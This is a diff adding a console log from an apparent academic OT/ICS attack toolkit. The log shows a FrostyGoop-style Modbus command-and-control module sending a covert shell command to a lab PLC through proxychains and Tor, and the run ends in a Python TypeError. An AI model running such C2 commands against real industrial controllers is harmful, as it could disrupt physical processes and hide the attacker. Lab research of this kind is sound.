@@ -1,0 +1,38 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  C2 Modbus (FrostyGoop) — Comando shell encubierto
+======================================================================
+  Fecha      : 2026-10-13 11:32:49
+  Objetivo   : mailbox=192.168.10.11:502, cmd='whoami'
+  MITRE ICS  : T0869, T0807
+======================================================================
+$ proxychains python3 -m modules._cli.c2_modbus_cli shell --mailbox 192.168.10.11 --mailbox-port 502 --command whoami
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+
+────────────────────────────────────────────────────────────
+[C2] Shell command: whoami
+────────────────────────────────────────────────────────────
+[*] Conectando a PLC-buzón 192.168.10.11:502...
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.11:502  ...  OK
+Traceback (most recent call last):
+  File "<frozen runpy>", line 203, in _run_module_as_main
+  File "<frozen runpy>", line 88, in _run_code
+  File "/ataques/modules/_cli/c2_modbus_cli.py", line 176, in <module>
+    main()
+    ~~~~^^
+  File "/ataques/modules/_cli/c2_modbus_cli.py", line 134, in main
+    c2_modbus._do_c2_shell(
+    ~~~~~~~~~~~~~~~~~~~~~~^
+        args.mailbox, args.mailbox_port,
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+        args.command, seq, xor_key, args.timeout, sink=_sink)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/ataques/modules/c2_modbus.py", line 290, in _do_c2_shell
+    ok = _do_send_command(mailbox_ip, mailbox_port, OP_SHELL,
+                          0, 0, command, seq, xor_key, sink)
+  File "/ataques/modules/c2_modbus.py", line 197, in _do_send_command
+    result = client.write_registers(CMD_BASE + 1, body, **{_kw: 1})
+TypeError: ModbusClientMixin.write_registers() got an unexpected keyword argument 'unit'
+[=] Código de salida: 1
